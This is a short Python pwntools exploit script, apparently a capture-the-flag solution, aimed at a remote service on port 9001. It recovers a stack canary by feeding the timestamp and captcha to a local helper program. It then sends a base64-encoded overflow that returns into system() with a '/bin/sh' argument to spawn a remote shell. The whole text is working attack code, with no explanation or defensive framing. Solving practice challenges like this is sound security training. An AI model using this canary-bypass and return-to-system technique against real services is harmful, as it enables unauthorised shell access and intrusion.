from pwn import *
import os
import time
import base64

context.log_level = 'debug'
p = remote("0",9001)

system = 0x8048880
timestamp = int(time.time())
print timestamp

captcha = p.recv().split(":")[-1].strip()

p.sendline(captcha)
print p.recv()
#Get Stack Cookie.

res = os.popen("./a.out " + str(timestamp) + " " + str(captcha)).read()
canary = int(res)

raw_input()
p.sendline(base64.b64encode("a" * 512 + p32(canary) + "a" * 12 + p32(system) + p32(0x11111111) + p32(0x804b0e0 + 0x2d0)) + "/bin/sh\x00")
print p.interactive()
